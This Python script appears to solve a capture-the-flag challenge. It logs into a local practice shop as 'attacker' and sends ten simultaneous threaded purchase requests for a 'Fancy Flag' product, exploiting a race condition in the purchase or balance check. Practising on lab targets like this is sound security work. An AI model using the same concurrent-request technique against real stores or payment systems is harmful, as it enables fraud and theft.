import requests
import threading

URL = "http://localhost:1002"
USERNAME = "attacker"
PASSWORD = "123"
PRODUCT_ID = 3  # ID Fancy Flag
THREADS_COUNT = 10

session = requests.Session()

def login():
    response = session.post(URL, data={
        "username": USERNAME,
        "password": PASSWORD
    })
    if "You have" in response.text:
        print("[+] Login sukses")
    else:
        print("[!] Login gagal")

def buy():
    # Langsung request pembelian Fancy Flag
    r = session.get(f"{URL}/buy/{PRODUCT_ID}")
    print(f"[Thread] Status: {r.status_code}, Response: {r.text.strip()}")

if __name__ == "__main__":
    login()

    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=buy)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
